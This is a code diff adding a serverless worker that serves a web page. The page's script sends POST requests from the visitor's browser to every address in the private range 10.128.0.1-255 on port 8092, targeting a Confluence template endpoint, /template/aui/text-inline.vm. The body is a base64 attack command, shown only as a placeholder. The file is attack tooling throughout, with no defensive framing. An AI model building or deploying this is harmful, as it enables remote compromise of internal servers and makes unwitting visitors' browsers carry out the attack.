@@ -1,0 +1,63 @@
+export default {
+  async fetch(request) {
+  const htmlContent = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>IP Range POST Requester</title>
+    <script>
+      function generateIPRange() {
+        const baseIP = "10.128.0.";
+        let ipRange = [];
+        for (let i = 1; i <= 255; i++) {
+            ipRange.push(baseIP + i);
+        }
+        return ipRange;
+      }
+      function sendRequests() {
+          const ipRange = generateIPRange();
+          for (let ip of ipRange) {
+            const xhr = new XMLHttpRequest();
+            const url = \`http://\$\{ip\}:8092/template/aui/text-inline.vm\`;
+            xhr.open('POST', url, true);
+      
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            //xhr.setRequestHeader('User-Agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36');
+      
+            // Handle the response
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log("success");
+                } else {
+                    console.log("else");
+                }
+            };
+      
+            xhr.onerror = function() {
+                console.log("xhr error");
+            };
+      
+            // Prepare the URL-encoded data
+            const data = atob('[b64 encoded attack command from ConfluenceWorker.js]');
+            console.log(data);
+            // Send the request
+            xhr.send(data);
+          }
+    }
+  </script>
+</head>
+<body>
+    <h1>POST Request Sender</h1>
+    <button onclick="sendRequests()">Send POST Requests</button>
+</body>
+</html>
+`;
+
+  return new Response(htmlContent, {
+    headers: {
+      'Content-Type': 'text/html'
+    },
+  });
+}
+}
